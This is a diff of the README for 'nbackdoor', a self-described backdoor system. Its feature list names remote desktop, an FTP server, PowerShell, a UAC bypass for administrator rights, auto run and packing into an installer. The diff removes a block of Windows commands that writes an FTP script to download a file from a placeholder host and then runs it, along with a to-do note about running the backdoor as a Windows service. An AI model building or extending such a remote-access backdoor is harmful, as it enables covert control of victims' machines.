@@ -1,21 +1,20 @@
 # nbackdoor
 **backdoor system**
 
-### Refactor!
-- new branch!
-- Framework: directly controler to client
+### Refactoring on the dev branch
+- directly controler to client
 - use normal socket to replace websocket
 - job pools
 - tools set：
   - Remote Desktop Protocol
   - ftp server
   - [PowerShell](http://drops.wooyun.org/tips/6090)
-  - other usefull bat
+  - other usefull bat scripts
   - ...
 
-- 管理员权限，绕过UAC
+- 管理员权限，绕过 UAC
 - auto run
-- box to installer
+- auto pack to installer
 - ...
 
 
@@ -43,27 +42,5 @@
 - [cmd shell -> ftp upload](http://home.51.com/xiaobai521100/diary/item/10008446.html)
 
 
-## useful cmds
-```
-shutdown -s -f
-taskkill /f /pid
-tasklist
-echo line1 > 1.txt
-echo line2 >> 1.txt
-
-echo open [ftp host] > ftp.txt
-echo [account]>> ftp.txt
-echo [password]>> ftp.txt
-echo binary >> ftp.txt
-echo get [download file] >> ftp.txt
-echo bye >> ftp.txt
-
-ftp -s:ftp.txt
-```
-
-## give up
-- [ ] backdoor 端使用 Windows Services 后台执行：https://github.com/Skycrab/pymgr
-- [x] jobs pool：用户异步命令执行结果返回并储存在服务端
-- [ ] jobs -clean
-- [ ] sae branch
-- [ ] 考虑 pre_send_char
+## screenshots
+![](art/1.png "")
